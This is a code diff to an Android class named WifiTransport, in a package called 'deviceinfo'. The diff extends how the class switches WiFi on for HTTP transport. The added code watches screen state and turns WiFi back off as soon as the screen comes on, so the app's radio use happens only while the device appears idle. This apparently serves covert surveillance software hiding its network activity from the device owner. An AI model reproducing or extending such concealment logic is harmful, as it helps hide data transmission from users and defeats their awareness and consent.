@@ -15,15 +15,20 @@ import android.net.NetworkInfo;
 import android.net.wifi.WifiManager;
 
 import com.android.deviceinfo.Device;
+import com.android.deviceinfo.Standby;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.interfaces.Observer;
+import com.android.deviceinfo.listener.ListenerStandby;
+import com.android.deviceinfo.module.ProcessObserver;
+import com.android.deviceinfo.module.StandByObserver;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Utils;
 
 /**
  * The Class WifiTransport.
  */
-public class WifiTransport extends HttpKeepAliveTransport {
+public class WifiTransport extends HttpKeepAliveTransport implements Observer<Standby>{
 	private static final String TAG = "WifiTransport"; //$NON-NLS-1$
 	/** The forced. */
 	private boolean forced;
@@ -116,14 +121,25 @@ public class WifiTransport extends HttpKeepAliveTransport {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (enable): cannot enable WiFi interface"); //$NON-NLS-1$
 			}
-		}
-
-		for (int i = 0; i < 20; i++) {
-			if (isAvailable()) {
-				break;
+		}else{
+			for (int i = 0; i < 30; i++) {
+				if (isAvailable()) {
+					break;
+				}
+	
+				Utils.sleep(1000);
 			}
-
-			Utils.sleep(1000);
+			
+			if(switchedOn && !ListenerStandby.self().isScreenOn()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (enable) ");
+				}
+				ListenerStandby.self().attach(this);
+			}
+		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (enable) finished " +isAvailable());
 		}
 	}
 
@@ -132,8 +148,26 @@ public class WifiTransport extends HttpKeepAliveTransport {
 		super.close();
 
 		if (switchedOn) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (close) detach Standby");
+			}
+			ListenerStandby.self().detach(this);
 			wifi.setWifiEnabled(false);
 			switchedOn = false;
 		}
+	}
+
+
+	@Override
+	public int notification(Standby b) {
+		if(b.isScreenOn() && switchedOn){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification) Switching off because screen is on");
+			}
+			ListenerStandby.self().detach(this);
+			wifi.setWifiEnabled(false);
+			switchedOn = false;
+		}
+		return 0;
 	}
 }
